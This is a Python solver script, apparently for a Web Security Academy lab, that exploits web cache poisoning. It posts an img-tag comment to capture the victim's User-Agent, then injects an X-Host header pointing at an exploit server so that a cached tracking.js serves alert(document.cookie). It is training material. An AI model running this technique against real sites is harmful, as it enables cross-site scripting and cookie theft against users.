import http.client
import re
import ssl
import time
import urllib.parse

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_post(
        user_agent: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', "/post?postId=4"
    host, port = f'{LAB_ID}.h1-web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
        'x-host': f'exploit-{EXPLOIT_SERVER_ID}.exploit-server.net'
    }
    if user_agent:
        headers['User-Agent'] = user_agent
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def POST_post_comment(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/post/comment'
    host, port = f'{LAB_ID}.h1-web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/post?postId=6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'postId': '4',
        'comment': f'<img src="https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net"/>',
        'name': 'fasdf',
        'email': 'dfasd@fasdf.com',
        'website': 'https://fasdf.com',
        'csrf': csrf,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def post_csrf() -> tuple[str, str]:
    response = GET_post()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


session, csrf = post_csrf()
response = POST_post_comment(session, csrf)
print(f"response: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())
print()

print("Exploit:")
print("File:")
print("/resources/js/tracking.js")
print(f"""
HTTP/1.1 200
Content-Type: application/javascript; charset=utf-8
""")
print("Body:")
print(f"""
alert(document.cookie)
""")
print("setup exploit and")
user_agent = input("paste victim user-agent from exploit server logs: ")
for i in range(5):
    response = GET_post(user_agent)
    print(f"response: {response.status}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print(response.read().decode())
    time.sleep(30 - int(response.headers['age']) + 1)
